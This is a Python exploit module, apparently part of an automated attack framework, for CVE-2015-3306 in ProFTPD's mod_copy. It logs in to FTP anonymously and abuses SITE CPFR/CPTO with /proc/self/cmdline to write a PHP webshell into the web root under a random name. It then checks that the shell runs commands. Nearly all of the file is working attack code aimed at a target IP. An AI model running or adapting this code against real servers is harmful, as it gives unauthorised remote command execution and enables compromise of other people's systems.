#######################################################
# proftpd mod_copy
# CVE-2015-3306
# Metasploit: unix/ftp/proftpd_modcopy_exec
#
# This exploit relies on both vulnerable FTP and HTTP
# with directory listing enabled. It allows you to
# upload PHP files to give you webshell access as the
# www-data user.
#######################################################

import socket, requests
import random, string
from utils import Exploit
from shells.webshell import WebShell

class FTPSocket:
    '''Class for interacting with FTP server
    I couldn't figure out how to make normal Python ftplib library work due to 
    weird anonymous user login problems.'''

    def __init__(self, ip: str):
        self.ip = ip
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def connect(self):
        '''Connect to FTP server'''
        self.s.settimeout(15)
        try:
            self.s.connect((self.ip, 21))
            return True
        except socket.timeout:
            # Connection to FTP timed out
            return False
        except Exception as e:
            # Could not connect to FTP for unknown reason
            return False
    
    def close(self):
        '''Close connection to FTP server'''
        self.s.close()

    def send(self, msg: str):
        '''Send a command to FTP server'''
        self.s.send((msg + '\r\n').encode())
        
    def receive(self):
        '''Receive response from FTP server'''
        return self.s.recv(1024).decode().strip('\n')

class ModCopy(Exploit):
    '''Class for performing the mod_copy exploit'''
    TEMP_DIR = '/tmp/'  # trailing slash is important

    def __init__(self, server_ip: str):
        super().__init__(
            os='linux',
            name='Proftpd mod_copy',
            description='',
            requirements=['ftp', 'http/80'],
            webserver=False,
            server_ip=server_ip
        )
    
    def attack(self, target: str):
        '''Perform the attack on a target and return a webshell'''
        payload_tempname = self.TEMP_DIR + WebShell.LINUX_CODE
        payload_filename = ''.join(random.choice(string.ascii_letters) for _ in range(5)) + '.php'

        ftp = FTPSocket(target)

        # Connect to FTP (anonymous)
        self.message(target, 'Connecting to FTP...')
        if not ftp.connect():
            self.error(target, 'Could not connect; skipping this target')
            return
        ftp.receive()

        # Copy cmdline (see next)
        ftp.send('SITE CPFR /proc/self/cmdline')
        ftp.receive()

        # Write to a file- this command becomes the contents of the file due to copy from cmdline
        ftp.send(f'SITE CPTO {payload_tempname}')
        ftp.receive()

        # Copy webshell
        ftp.send(f'SITE CPFR {payload_tempname}')
        ftp.receive()

        # Write webshell
        ftp.send(f'SITE CPTO /var/www/html/{payload_filename}')
        ftp.receive()

        ftp.close()
        url = f'http://{target}/{payload_filename}'
        webshell = WebShell(target, self.os, url)
        self.message(target, f'Wrote webshell to {url}')

        # Test if webshell works
        if webshell.cmd(''):
            # Return webshell
            self.success(target)
            return webshell
        else:
            self.error(target, 'An unknown error occurred when trying to reach the webshell')
            webshell.kill()
            return